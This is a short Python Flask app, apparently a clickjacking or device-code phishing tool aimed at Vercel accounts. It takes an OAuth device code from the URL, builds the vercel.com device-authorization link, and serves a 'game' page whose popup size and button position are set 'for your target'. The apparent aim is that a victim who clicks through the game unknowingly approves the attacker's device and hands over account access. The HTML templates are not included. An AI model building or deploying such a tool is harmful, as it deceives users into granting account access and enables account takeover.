#!/usr/bin/env python3
"""Flask app — local dev server *and* Vercel serverless handler."""

from flask import Flask, redirect, render_template, url_for, request
import os

# ---------------------------------------------------------------------------
# Configuration — edit these for your target
# ---------------------------------------------------------------------------

POPUP_SIZE = [561, 560]                        # [width, height] of the popup
BUTTON_OFFSET = {"pos": [224, 432], "size": [81, 48]}  # button position & size
USE_HISTORY_BACK = False                      # False = reload URL; True = history.back()

# ---------------------------------------------------------------------------

app = Flask(__name__)
app.secret_key = os.urandom(24)

button = BUTTON_OFFSET

DEVICE_URL = "https://vercel.com/oauth/device?user_code={code}"


@app.route("/")
def index_root():
    """Fallback: redirect to a default code or show instructions."""
    domain = request.host.split(":")[0]
    return render_template("index.html", domain=domain,
                           target_url="", code="")


@app.route("/<code>")
def index_with_code(code):
    """Dynamic route: /XXXX-XXXX → uses that device code."""
    domain = request.host.split(":")[0]
    target_url = DEVICE_URL.format(code=code)
    return render_template("index.html", domain=domain,
                           target_url=target_url, code=code)


@app.route("/game/<code>")
def game_with_code(code):
    """Game page for a specific device code."""
    target_url = DEVICE_URL.format(code=code)
    return render_template(
        "game.html",
        url=target_url,
        code=code,
        button=button,
        popup_size=POPUP_SIZE,
        use_history_back=USE_HISTORY_BACK,
    )


@app.route("/game")
def game_fallback():
    """Fallback game page (no code)."""
    return render_template(
        "game.html",
        url="",
        code="",
        button=button,
        popup_size=POPUP_SIZE,
        use_history_back=USE_HISTORY_BACK,
    )


@app.route("/clear")
def clear():
    return redirect(url_for("index_root"))


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=8000)
